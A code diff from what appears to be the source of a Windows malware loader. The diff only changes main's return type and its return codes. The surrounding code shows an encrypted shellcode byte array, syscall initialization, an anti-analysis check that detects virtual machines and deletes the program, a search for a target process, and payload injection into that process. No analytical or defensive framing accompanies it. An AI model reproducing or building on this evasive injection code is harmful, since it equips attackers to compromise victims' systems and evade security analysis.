@@ -26,7 +26,7 @@ UCHAR Payload[] = {
 		0xF9, 0xFA, 0x6B, 0xF4, 0x63, 0x61, 0xC7, 0x93, 0x70, 0x4B, 0x77, 0xE2, 0xBC, 0x06, 0x15, 0x56
 };
 
-BOOL main() {
+INT main() {
 
 	DWORD		dwProcessId = NULL;
 	HANDLE		hProcess = NULL;
@@ -37,7 +37,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Initialize Syscalls Structure \n");
 #endif
-		return FALSE;
+		return -1;
 	}
 	
 	if (!AntiAnalysis(20000)) {
@@ -45,7 +45,7 @@ BOOL main() {
 		PRINTA("[!] Detected A Virtualized Environment \n");
 #endif
 		DeleteSelf();
-		return FALSE;
+		return -1;
 	}
 	
 #ifdef TARGET_PROCESS
@@ -53,7 +53,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] Could Not Find Target Process Id \n");
 #endif
-		return FALSE;
+		return -1;
 	}
 #ifdef DEBUG
 	PRINTA("[+] Target Process Id Detected Of PID : %d \n", dwProcessId);
@@ -63,7 +63,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Inject Payload \n");
 #endif
-		return FALSE;
+		return -1;
 	}
 
 
@@ -73,9 +73,9 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Inject Payload \n");
 #endif
-	return FALSE;
+	return -1;
 }
 
 #endif 
-	return TRUE;
+	return 0;
 }
